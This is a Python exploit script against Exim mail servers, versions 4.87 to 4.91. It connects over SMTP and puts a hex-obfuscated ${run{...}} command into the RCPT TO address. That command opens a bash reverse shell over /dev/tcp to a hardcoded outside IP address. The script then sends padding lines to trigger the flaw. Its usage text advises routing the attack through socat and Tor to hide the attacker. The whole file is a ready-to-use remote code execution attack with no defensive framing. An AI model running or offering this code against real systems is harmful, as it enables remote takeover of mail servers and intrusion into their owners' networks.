#!/usr/bin/env python3
#For ssl port you mast be use a socat 
#Exim 4.87 - 4.91

import time
import sys
import socket
import os

host = 'localhost'
ip = "127.0.0.1"
port = 25
user = "root"
bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
payload = "${run{\\x2fbin\\x2fbash\\x20-c\\x20\\x22bash\\x20-i\\x20\\x3e\\x26\\x20\\x2fdev\\x2ftcp\\x2f190\\x2e115\\x2e18\\x2e115\\x2f5055\\x200\\x3e\\x261\\x22}}"
#  /bin/bash -c  "bash -i 0> /dev/tcp/   HOST   /   PORT     0>&"  HOST and PORT it's your own host with netcat listener for rewers shell

def write(data):
    d = bytes(str(data).encode("ASCII"))
    bot.send(d + b"\n")
def re():
    r = bot.recv(2048).decode("utf-8")
    return r

def exploit():
    try:
        time.sleep(2)
        print(re())
        time.sleep(1)
        write("EHLO localhost") # send EHLO
        write("MAIL FROM:<>") 
        print(re())
        write("RCPT TO:%s%s@%s" %(user,payload,host)) # send payload 
        time.sleep(2)
        o = re()
        print(o)

        if o[:2] != "250":
            print("ERORR:  may be incorect host (user$paylod@HOST)")
            sys.exit(1)

        write("DATA") # init payload
        print(re())
    
        for n in range(32):
            write("Received: %s" % n) # init too
    
        write("")
        write(".") # payload start
        print(re())
        print("You have 30 sec for you revers shell \n\t[!] Exit when complit. VOID shell -  if you exit now")
        print("\t[!] Enter for exit")
        input()
    except:
        print("\n")

if len(sys.argv) < 2:
    print("%s <host> [ <user> <ip> <port> ] optional \nDefault: \n\t user = root \n\t ip = 127.0.0.1 \n\t port = 25 \n" % sys.argv[0])
    print("Recomend use with SOCAT and Tor \n\tsudo socat TCP4-LISTEN:25,reuseaddr,fork SOCKS4A:127.0.0.1:HOST:25,socksport=9050")
    sys.exit(1)
if len(sys.argv) >= 4 : print("[!!!]Recomend use with SOCAT and Tor \n\tsudo socat TCP4-LISTEN:25,reuseaddr,fork SOCKS4A:127.0.0.1:HOST:25,socksport=9050")
host = sys.argv[1]
if len(sys.argv) >=3 :  user = sys.argv[2]
if len(sys.argv) >=4 :  ip   = sys.argv[3]
if len(sys.argv) >=5 :  port = sys.argv[4]

try:
    print("[*]Connect to %s:%d" % (ip,port))
    bot.connect((ip,port))
except:
    print("[!]Erorr conect")
    sys.exit(1)

print("[+]Connected")

exploit()
